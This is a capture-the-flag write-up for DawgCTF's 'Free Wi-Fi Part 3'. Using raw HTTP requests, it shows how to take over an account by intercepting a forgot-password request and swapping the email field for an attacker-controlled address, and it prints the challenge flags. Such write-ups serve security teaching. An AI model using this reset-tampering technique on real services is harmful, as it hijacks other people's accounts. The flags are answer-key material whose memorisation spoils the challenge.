Free Wi-Fi Part 3

Category: web/networking
Points: 200

Challenge

Let's steal someone's account.
http://freewifi.ctf.umbccd.io/
Authors: pleoxconfusa and freethepockets

Solution
The authentication page discovered during the previous step is the following.
```html




Staff Wifi Login Page


<!-- Bootstrap -->
<link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
<link rel="stylesheet" href="/static/css/main.css">






Welcome to the staff login page!

Staff login
You may use either of the following methods to logon.



Username:


Password:


<input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">


    <br/>

    <p><a href="forgotpassword.html">Forgot your password?</a></p>

    <h3> OR </h3>




Login with WifiKey:




</div>

  </div>

    <p class="space-above"><strong>DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}</strong></p>

</div>




<script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
<script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>



```
Analyzing the PCAP file, some interesting packets can be found: #469, #471 and #473.
```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://freewifi.ctf.umbccd.io/forgotpassword.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1
user=true.grit%40umbccd.io&csrf_token=ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M&email=true.grit%40umbccd.io&submit=Submit
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2420
Vary: Cookie
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:12:19 GMT




Forgot your password?


<!-- Bootstrap -->
<link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
<link rel="stylesheet" href="/static/css/main.css">






Forgot your password?
Please enter your email address.



Enter your email:


<input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">



Check your email for password reset link.
</div>




<script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
<script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>



```
You have discovered that:
1. a /forgotpassword.html page exists;
2. true.grit@umbccd.io is a user of the system;
3. the forgot password functionality uses two different fields for username and e-mail, with a JavaScript code to copy the value inserted into the input field.
As a consequence, it is sufficient to intercept the request and change the e-mail with one you control, leaving the discovered username.
```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/forgotpassword.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzozNA==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1
user=true.grit%40umbccd.io&csrftoken=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEDtg.QX6HWsJNM2Apsv3wUSKn4AIhl4&email=m3ssap0%40yopmail.com&submit=Submit
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 23:40:06 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 2018




Forgot your password?


<!-- Bootstrap -->
<link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
<link rel="stylesheet" href="/static/css/main.css">






Forgot your password?

Password recovery



Enter your email:


<input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">



DawgCTF{cl!3nts1d3v@l!d@t!0n1sd@ng3r0u5}




<script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
<script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>



```
The flag is the following.

DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}

